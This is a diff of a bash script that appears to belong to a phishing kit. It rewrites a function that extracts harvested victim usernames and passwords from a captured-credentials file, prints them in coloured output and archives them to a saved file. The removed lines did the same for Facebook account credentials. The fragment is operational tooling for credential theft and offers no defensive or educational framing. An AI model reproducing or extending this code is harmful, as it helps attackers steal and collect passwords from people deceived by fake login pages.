@@ -9,16 +9,12 @@ cat site/$server/ip.txt >> saved.ip.txt
 }
 
 password(){
-facebook=$(grep -o 'akun:*' site/login.php/usernames.txt | cut -d ":" -f2 )
-password=$(grep -o 'password:*' site/login.php/usernames.txt | cut -d ":" -f2 )
+account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-username=$(grep -o 'Account:*' site/login.php/usernames.txt | cut -d ":" -f2 )
-printf '\n'
-printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mAkun Fb:" $facebook
-printf '\n'
-printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mUsername:" $username
-printf '\n'
-printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mPassword:" $password
+password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Username:\e[0m\e[1;77m %s\n\e[0m" $account
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
+cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 }
 
 
